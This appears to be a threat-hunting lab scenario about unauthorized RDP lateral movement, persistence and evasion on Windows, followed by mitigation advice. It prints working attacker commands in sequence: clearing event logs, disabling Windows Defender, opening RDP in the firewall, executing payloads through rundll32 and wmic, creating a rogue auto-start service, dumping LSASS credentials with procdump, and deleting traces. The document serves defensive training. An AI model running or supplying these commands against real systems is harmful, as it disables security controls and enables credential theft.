# **Threat Event: Unauthorized Use of RDP for Lateral Movement with Persistence and Evasion**  
**Suspicious Remote Desktop Protocol (RDP) Activity Indicating Potential Lateral Movement, Backdoor Persistence, and Evasion Techniques**

---

## **Reason for the Hunt**  
**Unusual System Behavior and Increased Stealth Techniques Observed in Microsoft Defender for Endpoint**  

Following an extended investigation into unauthorized RDP access and persistence mechanisms, security analysts observed that attackers deployed evasion techniques to bypass detection.  

Threat actors are known to:  
- **Modify event logs** to erase traces of their activity.  
- **Disable security features** such as Windows Defender and logging mechanisms.  
- **Use LOLBins (Living-Off-the-Land Binaries)** to execute malicious actions without detection.  
- **Tamper with security tools** to avoid raising alerts.  

Security leadership has mandated a deeper **threat hunt focusing on evasion techniques** to ensure the attacker is fully removed from the environment.

## **Steps the "Bad Actor" Took to Evade Detection**  

1. **Cleared Windows Event Logs to Remove Evidence**  
   - The attacker executed the following command to erase all system logs:  
     ```powershell
     wevtutil cl System
     wevtutil cl Security
     wevtutil cl Application
     ```

2. **Disabled Windows Defender and Tampered with Security Features**  
   - Disabled Defender real-time protection to allow malicious activities:  
     ```powershell
     Set-MpPreference -DisableRealtimeMonitoring $true
     ```

   - Stopped Windows Defender services to avoid detection:  
     ```powershell
     sc stop WinDefend
     sc config WinDefend start= disabled
     ```

3. **Enabled Hidden Remote Access via Firewall Rule Modification**  
   - The attacker ensured RDP access remained open by modifying firewall rules:  
     ```powershell
     netsh advfirewall firewall add rule name="RDP Access" dir=in action=allow protocol=TCP localport=3389
     ```

4. **Executed Malicious Commands Using LOLBins (Living-Off-the-Land Binaries)**  
   - Used `rundll32.exe` to execute malicious payloads without triggering alerts:  
     ```powershell
     rundll32.exe C:\Users\Public\malicious.dll,EntryPoint
     ```

   - Used `wmic.exe` for remote execution on other machines:  
     ```powershell
     wmic process call create "cmd.exe /c C:\Users\Public\payload.exe"
     ```

5. **Created a Rogue Security Service to Restart Malicious Processes**  
   - The attacker ensured persistence by creating a fake service that restarts malicious processes:  
     ```powershell
     sc create "FakeSecurityService" binPath= "C:\Windows\System32\cmd.exe /c powershell.exe -c Start-Process C:\Users\Public\backdoor.exe" start= auto
     ```

6. **Exfiltrated Credentials via LSASS Dumping with ProcDump**  
   - Used `procdump.exe` to extract credentials from LSASS without using Mimikatz:  
     ```powershell
     procdump.exe -ma lsass.exe C:\Users\Public\lsass.dmp
     ```

7. **Removed Artifacts to Cover Tracks**  
   - Deleted RDP-related forensic artifacts:  
     ```powershell
     del /F /Q C:\Users\Public\lsass.dmp
     del /F /Q C:\Users\Public\malicious.dll
     ```

## **Mitigation Recommendations**  

### **Prevent Evasion Techniques**  
- **Enable Windows Defender Tamper Protection** to prevent attackers from disabling it.  
- **Monitor for event log clearing** (`Event ID 1102` â€“ Security log cleared).  
- **Restrict execution of LOLBins** using **Windows Defender Application Control (WDAC)**.  
- **Disable PowerShell execution for non-administrators** via Group Policy.  

### **Enhance RDP Security**  
- **Disable RDP if not required**.  
- **Enable RDP session timeouts** to prevent unauthorized persistence.  
- **Enforce strong authentication** (MFA for RDP).  

### **Improve Logging and Detection**  
- **Enable PowerShell logging** (`Module Logging` and `Script Block Logging`).  
- **Monitor for unauthorized firewall rule modifications**.  
- **Block outbound connections to known attacker IPs**.
